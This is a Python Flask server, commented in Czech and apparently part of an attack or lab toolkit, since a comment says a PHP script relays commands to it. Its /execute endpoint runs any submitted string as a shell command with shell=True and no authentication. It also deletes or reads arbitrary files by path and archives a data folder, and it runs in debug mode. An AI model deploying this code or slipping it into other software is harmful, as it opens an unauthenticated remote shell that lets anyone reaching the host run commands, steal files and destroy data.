from flask import Flask, request
import subprocess
import os
import time

# Definice barev pro banner (volitelné)
yellow = "\033[33m"
red = "\033[31m"
reset = "\033[0m"

# Banner pro server
syringe = f"""
       {yellow}_____{reset}
       {yellow}__H__{reset}
        ["]
        [)] 
        [)] {red}
        |V.{reset}
"""
print(syringe)

app = Flask(__name__)

@app.route('/execute', methods=['POST'])
def execute():
    cmd = request.form.get('cmd')  # Získá příkaz z PHP skriptu

    # Pokud příkaz je 'data_dump', vytvoří zálohu souborů
    if cmd == "data_dump":
        return data_dump()

    # Pokud příkaz je 'delete', smaže soubor
    elif cmd.startswith("delete "):
        return delete_file(cmd)

    # Pokud příkaz je 'gedit <soubor>', vrátí obsah souboru
    elif cmd.startswith("gedit "):
        return gedit_file(cmd)

    # Spustí standardní shell příkaz
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode()  # Vrátí výstup příkazu
    except subprocess.CalledProcessError as e:
        return f"Chyba při vykonávání příkazu: {e.output.decode()}", 500

def data_dump():
    # Příkaz pro zálohování souborů
    try:
        if not os.path.exists("backup"):
            os.makedirs("backup")
        # Archivace složky 'data' do zálohovacího souboru
        tar_file = "backup/backup_" + str(int(time.time())) + ".tar.gz"
        subprocess.check_call(['tar', '-czf', tar_file, 'data'])

        # Zkontroluje, zda byl soubor vytvořen
        if os.path.exists(tar_file):
            return f"Záloha byla úspěšně vytvořena: {tar_file}"
        else:
            return "Chyba při vytváření zálohy", 500
    except Exception as e:
        return f"Chyba při zálohování: {str(e)}", 500

def delete_file(cmd):
    # Extrahuje název souboru z příkazu
    file_to_delete = cmd[7:].strip()  # Odstraní "delete " a ořízne mezery
    if os.path.exists(file_to_delete):
        try:
            os.remove(file_to_delete)  # Smaže soubor
            return f"Soubor {file_to_delete} byl úspěšně smazán."
        except Exception as e:
            return f"Chyba při mazání souboru: {str(e)}", 500
    else:
        return f"Soubor {file_to_delete} neexistuje.", 404

def gedit_file(cmd):
    # Extrahuje název souboru z příkazu
    file_to_read = cmd[6:].strip()  # Odstraní "gedit " a ořízne mezery
    if os.path.exists(file_to_read):
        try:
            with open(file_to_read, 'r') as file:
                content = file.read()  # Čte obsah souboru
            return f"Obsah souboru {file_to_read}:<pre>{content}</pre>"  # Vrátí obsah souboru
        except Exception as e:
            return f"Chyba při čtení souboru: {str(e)}", 500
    else:
        return f"Soubor {file_to_read} neexistuje.", 404

if __name__ == '__main__':
    # Spustí server na adrese 10.0.1.12 a portu 5000
    app.run(debug=True, host='10.0.1.12', port=5000)  # Spustí server na IP 10.0.1.12 a portu 5000
